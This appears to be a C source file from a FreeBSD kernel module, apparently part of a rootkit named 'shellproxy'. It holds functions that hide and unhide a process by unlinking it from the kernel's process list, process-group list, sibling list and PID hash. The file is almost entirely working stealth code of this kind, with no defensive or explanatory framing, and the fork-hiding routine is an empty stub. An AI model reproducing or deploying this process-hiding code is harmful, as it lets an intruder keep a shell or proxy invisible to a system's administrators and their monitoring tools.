#include "shellproxy.h"
#include <sys/sx.h>

void proxy_hide (struct proc* p)
{
	sx_xlock(&allproc_lock);
	LIST_REMOVE(p, p_list);
	allproc_gen++;
	sx_xunlock(&allproc_lock);

	sx_xlock(&proctree_lock);
	LIST_REMOVE(p, p_sibling);
	if (p->p_pgrp!=NULL) {
		struct pgrp* pg = p->p_pgrp;

		PGRP_LOCK(pg);
		PROC_LOCK(p);
		LIST_REMOVE(p, p_pglist);
		PROC_UNLOCK(p);
		PGRP_UNLOCK(pg);
	}
	sx_xunlock(&proctree_lock);

	sx_xlock(PIDHASHLOCK(p->p_pid));
	LIST_REMOVE(p, p_hash);
	sx_xunlock(PIDHASHLOCK(p->p_pid));
}

void proxy_unhide (struct proc* p)
{
	sx_xlock(&allproc_lock);
	LIST_INSERT_HEAD(&allproc, p, p_list);
	allproc_gen++;
	sx_xunlock(&allproc_lock);

	sx_xlock(PIDHASHLOCK(p->p_pid));
	LIST_INSERT_HEAD(PIDHASH(p->p_pid), p, p_hash);
	sx_xunlock(PIDHASHLOCK(p->p_pid));

	sx_xlock(&proctree_lock);
	if (p->p_pptr!=NULL)
		LIST_INSERT_HEAD(&p->p_pptr->p_children, p, p_sibling);
	if (p->p_pgrp!=NULL) {
		struct pgrp* pg = p->p_pgrp;

		PGRP_LOCK(pg);
		PROC_LOCK(p);
		LIST_INSERT_HEAD(&pg->pg_members, p, p_pglist);
		PROC_UNLOCK(p);
		PGRP_UNLOCK(pg);
	}
	sx_xunlock(&proctree_lock);
}

void proxy_forkhide_on (void)
{
}
